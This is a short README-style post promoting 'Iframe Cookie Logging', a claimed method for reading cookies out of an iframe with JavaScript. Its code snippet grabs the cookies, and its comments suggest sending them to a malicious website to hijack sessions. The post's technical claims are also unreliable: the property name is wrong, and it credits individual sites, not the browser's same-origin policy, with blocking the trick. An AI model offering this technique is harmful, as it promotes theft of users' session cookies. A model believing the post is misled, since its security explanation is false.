# ICL
ICL, also known as Iframe Cookie Logging is a method that gets cookies in a iframe element. ICL is really easy to implement as it uses built-in JS functions. We load the iframe and we can get the cookies in it.

### Should i worry about this method?
No, most websites like ROBLOX, Twitter and other sites have implemented a feature that blocks any third party iframes from accessing its contents which prevents this method from being used.


````js
 var iframe = document.getElementById("foo"); // your frame id or point to a element.
  var cookies = iframe.contentWindow.document.cookies;
  alert(cookies)
  
  // Now the cookies element has been defined, you can
  // send it to a malicious website, store it on a
  // database and yeah. Treat it like it was your
  // site and you executing JS.
````
